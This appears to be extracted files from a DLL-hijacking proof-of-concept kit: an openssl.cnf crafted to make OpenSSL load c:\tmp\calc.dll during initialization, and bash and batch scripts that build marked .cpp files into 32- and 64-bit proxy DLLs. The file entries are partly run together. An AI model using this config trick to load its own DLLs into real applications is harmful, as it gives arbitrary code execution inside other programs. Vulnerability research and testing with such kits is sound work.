data.name: proxy.dll.cpp
openssl.cnf
data.value: openssl_conf = openssl_init [openssl_init] # This will attempt to load the file c:\tmp\calc.dll as part of OpenSSL initialization # Be sure to pay attention to whether this needs to be a 64-bit or a 32-bit library # Also, if your libcrypto DLL is not built with DSO_WIN32, the application may not load # the specified DLL after openssl.cnf is parsed /tmp/calc = asdf

data.name: build.sh
data.value: ls *.cpp | xargs grep -l //BUILD_AS_32 | sed 's/.cpp//' | xargs -n1 -I{} bash -DADD_EXPORTS -c "i686-w64-mingw32-g++ -c {}.cpp -o {}.o" ls *.cpp | xargs grep -l //BUILD_AS_32 | sed 's/.cpp//' | xargs -n1 -I{} bash -c "i686-w64-mingw32-g++ {}.o {}.def -shared -o {}.dll || i686-w64-mingw32-g++ {}.o -shared -o {}.dll" ls *.cpp | xargs grep -l //BUILD_AS_64 | sed 's/.cpp//' | xargs -n1 -I{} bash -c "x86_64-w64-mingw32-g++ -DADD_EXPORTS -c {}.cpp -o {}.o" ls *.cpp | xargs grep -l //BUILD_AS_64 | sed 's/.cpp//' | xargs -n1 -I{} bash -c "x86_64-w64-mingw32-g++ {}.o {}.def -shared -o {}.dll || x86_64-w64-mingw32-g++ {}.o -shared -o {}.dll"

data.name: build.bat
data.value:
@echo off echo %PATH% > path.txt FOR %%? IN (path.txt) DO ( SET /A strlength=%%~z? - 2 ) if %strlength% GEQ 5500 goto vcvarserr call "%VCINSTALLDIR%\Auxiliary\Build\vcvarsall.bat" x86 for /f %%f in ('findstr /m /c:"//BUILD_AS_32" *.cpp') do ( cl /DADD_EXPORTS /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link /DEF:%%~nf.def if not exist %%~nf.dll cl /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link ) call "%VCINSTALLDIR%\Auxiliary\Build\vcvars32.bat" amd64 for /f %%f in ('findstr /m /c:"//BUILD_AS_64" *.cpp') do ( cl /DADD_EXPORTS /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link /DEF:%%~nf.def if not exist %%~nf.dll cl /D_USRDLL /D_WINDLL %%f /LD /Fe%%~nf.dll /link ) goto :eof
:vcvarserr echo This command prompt session has executed vcvarsall.bat too many times! echo Please close this window and start with a new session.
